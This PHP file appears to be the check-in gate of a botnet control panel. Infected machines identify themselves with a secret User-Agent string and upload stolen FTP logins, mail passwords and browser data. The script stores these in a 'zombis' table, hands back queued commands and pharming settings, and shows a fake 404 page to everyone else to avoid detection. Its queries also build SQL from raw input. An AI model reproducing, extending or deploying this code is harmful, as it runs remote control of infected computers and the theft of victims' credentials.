<?php
require_once('Ads/Class/class.base.de.datos.php');
require_once('Ads/Configs/Configs.php');
require_once('Ads/Configs/Pass.php');


$incs="Ads/Controladores/geoip.inc";
$ipbs="Ads/Controladores/geoip.dat";
 # Country code 
 include_once($incs);
 $gi=geoip_open($ipbs, GEOIP_STANDARD);
 $cc=geoip_country_code_by_addr($gi,getenv("REMOTE_ADDR")); 
 if(empty($cc)) $cc = "Desconosido";
 geoip_close($gi);

 # Country name
 include_once($incs);
 $gi=geoip_open($ipbs, GEOIP_STANDARD);
 $cn=geoip_country_name_by_addr($gi,getenv("REMOTE_ADDR"));
 if(empty($cn)) $cn = "Desconosido";
 geoip_close($gi);
$header = cleanstring($_SERVER['HTTP_USER_AGENT']);
if($header == "QfH205c3Msk2+mAVLjb6Tgb6S4/9QfPqblc5LDgsSIQuQfPq05c3MsgsS2J6S41zKiT=+iHNMiTaOxu60/CC"){
	$Name = $_GET['iName'] ;
	$SO = $_GET['iSO']; 
	$zila = $_GET['STLftps'];
	$Pasw = $_GET['STLmails'];
	$IE = $_GET['STLie78'];
	$Infos = $_GET['Infos'];
	$ip = getenv("REMOTE_ADDR");
	$host = gethostbyaddr($ip);
	
	
	$Zombie = $DB->Select("SELECT * FROM zombis WHERE name='".$Name."'");
	if( count($Zombie) <= 0 ){
		$Sql = "INSERT INTO zombis 
		(id , name , fecha , ip , host , pais , flag , idcmds , so , ftps , pasw , ie , infos , cmds , a)
		VALUES (NULL , '".$Name."' , NULL , '".$ip."' , '".$host."' , '".$cn."' , '".$cc."' , '1' , '".$SO."' , '".$zila."' ,  '".$Pasw."' , '".$IE."' , 'Ready' , 'IDLE' , 1);" ;
		$DB->Query($Sql);
	} else {
	
	$X = @rand(0,99999999999);
		$DB->Query("UPDATE zombis SET ip='".$ip."' , ftps='".$zila."' , pasw='".$Pasw."' , ie='".$IE."' , infos='".$Infos."'  , a='".$X."' WHERE name='".$Name."'") ;

	}


}






$Zombis = $DB->Select("SELECT * FROM  zombis WHERE name='".$Name."'");
$Pharming = $DB->Select("SELECT * FROM pharming");







$cmdarray = array();
$cmdarray = explode(' ', $Zombis[0]['cmds']);
if ($cmdarray[0] == 'Command')
{
					$cmdprocessed = $Zombis[0]['cmds'];
				}
				else
				{
					$cmdprocessed = 'Command Processed: ' . $Zombis[0]['cmds'];
				}
$DB->Query("UPDATE zombis SET  cmds='".$cmdprocessed."' WHERE name='".$Name."'") ;



if ($Zombis[0]['cmds'] == "Command Processed: Remove.Bot")
			{
	            $UpdateBuscar = array('name' => $Name) ;
	            $DB->Delete('zombis' , false , $UpdateBuscar) ;
                die();
			}

if ($header == "QfH205c3Msk2+mAVLjb6Tgb6S4/9QfPqblc5LDgsSIQuQfPq05c3MsgsS2J6S41zKiT=+iHNMiTaOxu60/CC")
{

  echo CMD_SPLIT,$Zombis[0]['cmds'],CMD_SPLIT,$Pharming[0]['status'],CMD_SPLIT,$Pharming[0]['pharming'],CMD_SPLIT;
	 
  }
else {
	
		
		// 404 it so no one detects the page
		
		
		echo '
		<html><head>
		<title>404 Not Found</title>
		</head><body>
		<h1>Not Found</h1>
		<p>The requested URL ';
		echo $_SERVER['PATH_TRANSLATED'];
		echo '/ was not found on this server.</p>
		<hr>
		<address>';
		echo $_SERVER['SERVER_SIGNATURE'];
		echo ' Server at ';
		echo $_SERVER['HTTP_HOST'];
		echo ' Port ';
		echo $_SERVER['SERVER_PORT'];
		echo '</address>
		</body></html>
		';
		}
		
	
?>